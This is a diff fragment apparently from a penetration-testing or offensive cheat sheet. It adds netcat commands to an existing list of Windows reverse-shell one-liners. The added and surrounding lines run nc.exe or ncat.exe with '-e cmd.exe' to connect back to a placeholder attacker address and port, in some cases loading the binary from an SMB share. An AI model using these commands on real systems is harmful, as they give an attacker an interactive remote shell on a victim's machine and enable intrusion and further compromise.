@@ -46,6 +46,12 @@ chmod +x /tmp/nc
 ```bash
 //$source_ip/$smb_share/lists/static-binaries/binaries/windows/x86/ncat.exe $source_ip $source_port  --ssl -e cmd -v 
 ```
+```bash
+nc.exe -e cmd.exe $source_ip $source_port
+```
+```bash
+//$source_ip/$smb_share/tools_windows/bin/nc.exe $source_ip $source_port -e cmd.exe
+```
 
 #### Reverse Shell
 ```powershell
